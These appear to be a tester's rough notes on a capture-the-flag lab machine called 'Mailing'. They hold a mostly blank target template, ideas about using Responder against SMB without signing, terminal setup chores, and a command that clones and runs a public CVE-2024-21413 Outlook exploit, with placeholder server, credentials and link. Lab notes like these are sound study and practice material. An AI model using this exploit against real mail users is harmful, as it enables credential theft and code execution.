# Mailing Notes

## Data

IP:
OS: Windows 10 / Server 2019 Build 19041   
Arch: x64
Hostname: MAILING1
DNS: MAILING
Domain:  
Machine Purpose: EMAILS
Services:
Service Languages: asp
Users:
Email and Username Formatting:
Credentials:



#### Mindmap-per Service

- OS detect, run generate noting for nmap
- smb is [[smb-signing-not-required-mailing.htb_445]] - Responder at some privilege escalation point?
	
- instructions.pdf

- 25 checked
-
-
-
-
-
-
-
-
-
-
-
-



#### Todo List

- Check each email port 
- Think about swaqs, passwords, major cve pocs on email service version 
- Thunderbird on Windows?

		- no terminal transparency 
		- Desktop Background change
		- bash incorrect shell startup display
		- color scheme
		- Terminal add a space?
		- window titlebar right
		- tmux config
			- change color
			- add bar for vim line numbering
			- finish tmux log everything
		- log everything script
		- No GUI sounds
		- new terminal or alt+h conflicts with tmux
		- gzip -d /usr/share/wordlists/rockyou.txt
#### Done



grepmorecoffee
```bash
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git


python CVE-2024-21413.py --server "<SMTP server>" --port <SMTP port> --username "<SMTP username>" --password "<SMTP password>" --sender "<sender email>" --recipient "<recipient email>" --url "<link URL>" --subject "<email subject>"
```

Scheduled Task